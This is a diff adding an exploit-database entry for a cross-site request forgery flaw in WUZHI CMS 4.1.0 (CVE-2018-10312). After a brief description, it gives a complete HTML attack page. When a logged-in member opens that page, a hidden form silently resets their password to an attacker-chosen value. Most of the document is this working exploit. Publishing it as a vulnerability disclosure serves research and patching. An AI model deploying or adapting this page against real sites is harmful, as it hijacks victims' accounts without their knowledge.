@@ -1,0 +1,23 @@
+# Exploit Title: WUZHI CMS 4.1.0 - Cross-Site Request Forgery
+# Date: 2018-04-23
+# Exploit Author: jiguang (s1@jiguang.in)
+# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
+# Software Link: https://github.com/wuzhicms/wuzhicms
+# Version: 4.1.0
+# CVE: CVE-2018-10312
+
+An issue was discovered in WUZHI CMS 4.1.0 (https://github.com/wuzhicms/wuzhicms/issues/132)
+There is a  csrf vulnerability that can modifying the member's password. via index.php?m=member&v=pw_reset
+After the member logged in. open the exp page
+
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://localhost/www/index.php?m=member&v=pw_reset" method="POST">
+      <input type="hidden" name="password" value="yuduo" />
+      <input type="hidden" name="password2" value="yuduo" />
+      <input type="hidden" name="submit" value="ç&#161;&#174;&#32;å&#174;&#154;" />
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
